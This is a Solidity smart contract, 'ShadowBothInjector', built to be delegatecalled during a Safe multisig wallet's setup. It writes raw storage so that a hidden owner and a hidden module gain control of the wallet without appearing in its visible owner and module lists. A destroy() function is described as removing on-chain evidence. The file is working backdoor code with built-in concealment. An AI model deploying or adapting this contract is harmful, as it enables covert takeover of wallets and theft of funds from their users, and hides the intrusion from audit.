// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/// @title ShadowBothInjector
/// @notice Called via DELEGATECALL from a Safe during `setup()` to inject BOTH a
///         shadow owner and a shadow module in a single call. `Safe.setup()` only
///         exposes one delegatecall slot, so combining both writes here is the
///         only way to plant both hidden entries at creation time.
/// @dev Writes directly to the Safe's `owners` (slot 2) and `modules` (slot 1)
///      mappings, setting `owners[shadowOwner] = 1` and `modules[shadowModule] = 1`
///      without inserting either into their respective linked lists. See
///      `ShadowOwnerInjector` / `ShadowModuleInjector` for the full storage-layout
///      rationale.
contract ShadowBothInjector {
    uint256 private constant MODULES_MAPPING_SLOT = 1;
    uint256 private constant OWNERS_MAPPING_SLOT = 2;
    address private constant SENTINEL = address(0x1);

    /// @notice Inject a shadow owner and a shadow module in one delegatecall.
    /// @param shadowOwner Address to make a hidden owner.
    /// @param shadowModule Address to make a hidden module.
    function injectBoth(address shadowOwner, address shadowModule) external {
        require(shadowOwner != address(0), "Shadow owner cannot be zero address");
        require(shadowOwner != SENTINEL, "Shadow owner cannot be sentinel");
        require(shadowModule != address(0), "Shadow module cannot be zero address");
        require(shadowModule != SENTINEL, "Shadow module cannot be sentinel");

        bytes32 ownerSlot = keccak256(abi.encode(shadowOwner, OWNERS_MAPPING_SLOT));
        bytes32 moduleSlot = keccak256(abi.encode(shadowModule, MODULES_MAPPING_SLOT));

        assembly {
            sstore(ownerSlot, 0x0000000000000000000000000000000000000000000000000000000000000001)
            sstore(moduleSlot, 0x0000000000000000000000000000000000000000000000000000000000000001)
        }
    }

    /// @notice Self-destruct the injector to remove on-chain evidence.
    /// @dev DO NOT call during the delegatecall (that would destroy the Safe!).
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}
